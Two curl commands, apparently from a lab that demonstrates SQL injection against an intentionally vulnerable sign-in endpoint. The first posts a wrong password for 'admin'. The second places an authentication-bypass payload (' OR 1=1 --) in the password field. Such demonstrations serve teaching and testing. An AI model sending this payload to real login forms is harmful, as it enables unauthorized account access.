curl $URL/sqli/vulnerable/v1/accounts/sign-in \
  --header "Content-Type: application/json" \
  --request POST \
  --data '{"username":"admin","password":"wrong password"}' \
  -s -i

curl $URL/sqli/vulnerable/v1/accounts/sign-in \
  --header "Content-Type: application/json" \
  --request POST \
  --data '{"username":"admin","password":"wrong password'\'' OR 1=1 --"}' \
  -s | jq